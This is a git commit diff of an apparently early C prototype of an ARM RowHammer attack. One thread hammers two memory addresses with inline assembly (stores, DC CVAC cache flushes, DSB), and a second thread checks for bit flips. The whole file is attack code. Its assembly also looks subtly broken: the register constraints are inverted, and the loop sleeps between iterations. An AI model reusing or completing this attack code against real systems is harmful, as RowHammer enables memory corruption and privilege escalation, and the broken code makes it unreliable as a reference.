a24c80655a1b5e977a82f147bc82946080966e01
Kasper Seglem <kasperseglem@Kaspers-MacBook-Pro.local>
2022-11-02 09:53:38 -0600

    hammer asm done

--- file.c
+++ file.c
@@ -3,10 +3,13 @@
 #include <unistd.h>
 #include <pthread.h>
 
+struct thread_args {
+	int *addr1;
+	int *addr2;
+};
+
+
 /*
-
-ARM RowHammer Attack
-
 put addr1 into X9
 put addr2 into X10
 for i := 0 to N − 1 do
@@ -15,14 +18,38 @@ for i := 0 to N − 1 do
    DC CVAC, X9
    DC CVAC, X10
    DSB 0xB
-hello
 */
+
 
 void *rowhammer(void *input)
 {
+	struct thread_args *args = input;
+	printf("addr1: %p\n",(void*) args->addr1);
+	printf("addr2: %p\n",(void*) args->addr2);
+
+	// put add1 into x9
+	asm ("mov x9, %0;"
+	:"=r"(args->addr1)
+	:
+	:);
+
+	// put addr2 into x10
+	asm ("mov x10, %0;"
+	:"=r"(args->addr2)
+	:
+	:);
+
+	// loop
 	while(1) {
-		printf("x = %d\n", *(int *)input);
-		printf("hammering...\n");
+
+		asm(
+			"STR X0, [X9]\t\n"
+			"STR X0, [X10]\t\n"
+			"DC CVAC, X9\t\n"
+			"DC CVAC, X10\t\n"
+			"DSB 0xB\t\n"
+		);
+
 		sleep(1);
 	}
 
@@ -31,6 +58,10 @@ void *rowhammer(void *input)
 
 void *check(void *input)
 {
+	struct thread_args *args = input;
+        printf("addr1: %p\n",(void*) args->addr1);
+        printf("addr2: %p\n",(void*) args->addr2);
+
 	sleep(5);
 	printf("x = %d\n", *(int *)input);
 	printf("checking...\n");
@@ -39,22 +70,26 @@ void *check(void *input)
 
 int main()
 {
-	printf("starting\n");
+	printf("starting...\n");
 
-	int x = 5; 
-	int *ptr = &x;
+	int x = 5;
+	int y = 7; 
+
+	struct thread_args *args = malloc (sizeof (struct thread_args));
+	args->addr1 = &x;
+	args->addr2 = &y;
 
 	pthread_t pthread_hammer;
 	pthread_t pthread_check;
 
-	pthread_create(&pthread_hammer, NULL, rowhammer, ptr);
-	pthread_create(&pthread_check, NULL, check, ptr);
+	pthread_create(&pthread_hammer, NULL, rowhammer, args);
+	pthread_create(&pthread_check, NULL, check, args);
 
 	pthread_join(pthread_check, NULL);
 	printf("read disturb found\n");
 
 	pthread_cancel(pthread_hammer);
-	printf("exiting\n");
+	printf("exiting...\n");
 
 	return 0;
 }
